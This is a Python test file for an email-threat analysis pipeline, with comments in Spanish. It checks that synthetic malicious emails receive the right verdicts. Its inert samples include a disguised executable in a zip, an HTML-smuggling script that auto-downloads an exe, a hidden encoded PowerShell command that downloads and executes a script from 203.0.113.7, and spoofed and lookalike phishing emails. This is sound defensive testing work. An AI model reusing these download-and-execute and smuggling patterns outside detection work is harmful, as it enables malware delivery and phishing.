"""Tests de punta a punta: mail crudo -> parser real -> todos los analizadores reales -> veredicto.

Sin red (reputación apagada) y sin clamd (el analizador clamav queda deshabilitado).
Las muestras son sintéticas e inertes.
"""

from __future__ import annotations

import base64
import io
import struct
import zipfile

import httpx
import pytest

from centinela.analyzers import build_analyzers
from centinela.core.cache import MemoryCache
from centinela.core.models import VerdictLevel
from centinela.core.pipeline import Pipeline
from tests.helpers import build_eml, make_raw


def minimal_pe() -> bytes:
    """PE32 mínimo (DOS header + PE header + optional header + 1 sección vacía). No ejecuta nada útil."""
    dos = bytearray(64)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 64)
    coff = struct.pack("<4sHHIIIHH", b"PE\0\0", 0x14C, 1, 0x5F000000, 0, 0, 0xE0, 0x0102)
    opt = bytearray(0xE0)
    struct.pack_into("<H", opt, 0, 0x10B)  # PE32
    struct.pack_into("<I", opt, 16, 0x1000)  # AddressOfEntryPoint
    struct.pack_into("<I", opt, 28, 0x400000)  # ImageBase
    struct.pack_into("<I", opt, 32, 0x1000)  # SectionAlignment
    struct.pack_into("<I", opt, 36, 0x200)  # FileAlignment
    struct.pack_into("<H", opt, 40, 6)  # MajorOSVersion
    struct.pack_into("<H", opt, 48, 6)  # MajorSubsystemVersion
    struct.pack_into("<I", opt, 56, 0x2000)  # SizeOfImage
    struct.pack_into("<I", opt, 60, 0x200)  # SizeOfHeaders
    struct.pack_into("<H", opt, 68, 2)  # Subsystem GUI
    struct.pack_into("<I", opt, 92, 16)  # NumberOfRvaAndSizes
    section = struct.pack("<8sIIIIIIHHI", b".text", 0x1000, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0x60000020)
    headers = bytes(dos) + coff + bytes(opt) + section
    headers += b"\0" * (0x200 - len(headers))
    return headers + b"\xc3" + b"\0" * 0x1FF


def zip_bytes(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return buf.getvalue()


@pytest.fixture
async def pipeline(settings):
    settings.privacy.hash_lookups = False
    settings.privacy.url_lookups = False
    settings.analyzers.disabled = ["clamav"]
    async with httpx.AsyncClient() as http:
        p = Pipeline(settings, build_analyzers(settings), http, MemoryCache())
        await p.setup()
        yield p
        await p.close()


async def test_all_analyzers_load(pipeline):
    names = {a.name for a in pipeline.analyzers}
    expected = {
        "headers",
        "urls",
        "content",
        "filetype",
        "yara",
        "office",
        "pdf",
        "pe",
        "scripts",
        "lnk",
        "html",
        "onenote",
    }
    assert expected <= names, f"faltan analizadores: {expected - names}"


async def test_benign_mail_is_clean(pipeline):
    eml = build_eml(
        subject="Reunión del jueves",
        from_="Ana Pérez <ana@cliente.com.ar>",
        text="Hola, confirmo la reunión del jueves a las 10. Saludos, Ana.",
        html="<p>Hola, confirmo la reunión del jueves a las 10.</p><p>Saludos, <b>Ana</b></p>",
    )
    result = await pipeline.analyze(make_raw(eml))
    assert result.verdict.level == VerdictLevel.CLEAN, result.findings
    assert not result.errors, result.errors


async def test_disguised_exe_in_zip_is_malicious(pipeline):
    payload = zip_bytes({"Factura_0045-00012345.pdf.exe": minimal_pe()})
    eml = build_eml(
        subject="Factura pendiente de pago",
        from_="Facturación <facturacion@proveedor-xyz.com>",
        text="Adjuntamos la factura vencida. Por favor abonar hoy.",
        attachments=[("Factura_0045.zip", payload, "application/zip")],
    )
    result = await pipeline.analyze(make_raw(eml))
    assert result.verdict.level == VerdictLevel.MALICIOUS, [(f.rule, f.score) for f in result.findings]
    rules = {f.rule for f in result.findings}
    assert any(r.startswith("filetype.") for r in rules)
    assert any(r.startswith("pe.") for r in rules)
    exe = [a for a in result.artifacts if a.detected_type == "pe"]
    assert exe and exe[0].depth == 1 and len(exe[0].sha256) == 64


async def test_html_smuggling_attachment(pipeline):
    blob = base64.b64encode(minimal_pe()).decode()
    html = f"""<html><body><script>
    var b64 = "{blob}";
    var bin = atob(b64); var arr = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
    var blob = new Blob([arr], {{type: 'application/octet-stream'}});
    var a = document.createElement('a'); a.href = URL.createObjectURL(blob);
    a.download = 'Comprobante.exe'; document.body.appendChild(a); a.click();
    </script></body></html>"""
    eml = build_eml(
        subject="Comprobante de transferencia",
        text="Le enviamos el comprobante.",
        attachments=[("Comprobante.html", html.encode(), "text/html")],
    )
    result = await pipeline.analyze(make_raw(eml))
    assert result.verdict.level in (VerdictLevel.SUSPICIOUS, VerdictLevel.MALICIOUS)
    assert any(f.rule.startswith("html.") for f in result.findings)


async def test_own_domain_spoof(pipeline):
    eml = build_eml(
        subject="Transferencia urgente",
        from_="Director <director@empresa.com>",
        text="Necesito que hagas una transferencia hoy a la nueva cuenta. Estoy en una reunión.",
        headers={
            "Authentication-Results": "mx.google.com; spf=fail smtp.mailfrom=empresa.com; dkim=none; "
            "dmarc=fail (p=NONE) header.from=empresa.com",
            "Reply-To": "director.empresa@gmail.com",
        },
    )
    result = await pipeline.analyze(make_raw(eml))
    assert result.verdict.level in (VerdictLevel.SUSPICIOUS, VerdictLevel.MALICIOUS)
    assert any(f.rule.startswith("headers.") for f in result.findings)


async def test_powershell_downloader_script(pipeline):
    import base64 as b

    inner = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')"
    enc = b.b64encode(inner.encode("utf-16-le")).decode()
    script = f"powershell.exe -nop -w hidden -EncodedCommand {enc}\r\n".encode()
    eml = build_eml(
        subject="Pedido de cotización",
        text="Ver adjunto.",
        attachments=[("cotizacion.bat", script, "application/octet-stream")],
    )
    result = await pipeline.analyze(make_raw(eml))
    assert result.verdict.level == VerdictLevel.MALICIOUS, [(f.rule, f.score) for f in result.findings]


async def test_phishing_link_lookalike(pipeline):
    eml = build_eml(
        subject="Su cuenta será suspendida",
        from_="Mercado Pago <notificaciones@mercadopago-seguridad.xyz>",
        text="Verifique su cuenta para evitar la suspensión.",
        html='<p>Verifique su cuenta: <a href="https://mercadopag0-login.xyz/ingresar">https://www.mercadopago.com.ar</a></p>',
    )
    result = await pipeline.analyze(make_raw(eml))
    assert result.verdict.level in (VerdictLevel.SUSPICIOUS, VerdictLevel.MALICIOUS)
    assert any(f.rule.startswith("url.") or f.rule.startswith("urls.") for f in result.findings)


async def test_hostile_garbage_does_not_crash(pipeline):
    garbage = b'From: x\r\nContent-Type: multipart/mixed; boundary="\r\n\r\n--\r\n' + bytes(range(256)) * 50
    result = await pipeline.analyze(make_raw(garbage))
    assert result.verdict.level in (VerdictLevel.CLEAN, VerdictLevel.ERROR, VerdictLevel.SUSPICIOUS)
